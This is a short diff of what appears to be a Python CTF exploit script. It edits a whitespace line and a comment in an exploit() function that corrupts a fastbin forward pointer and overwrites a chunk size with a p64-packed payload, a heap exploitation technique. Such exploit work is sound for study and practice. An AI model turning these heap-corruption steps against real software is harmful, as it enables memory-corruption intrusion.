@@ -44,7 +44,7 @@ def exit():
 
 def exploit(r):
 
-    
+
     r.recvuntil("Command: ")
     
     alloc(0x20) #[0]
@@ -67,7 +67,7 @@ def exploit(r):
 
 
     #now we have corrupted the FD of the fastbin up to be alloced
-    #but we must also change the size of the small chunk to 0x31 so that we can malloc it
+    #but we must also change the size of the small chunk to 0x31 so that we can malloc it as a fastbin 
     payload =""
     payload += p64(0)*5 + p64(0x31)
     fill(3,len(payload),payload)
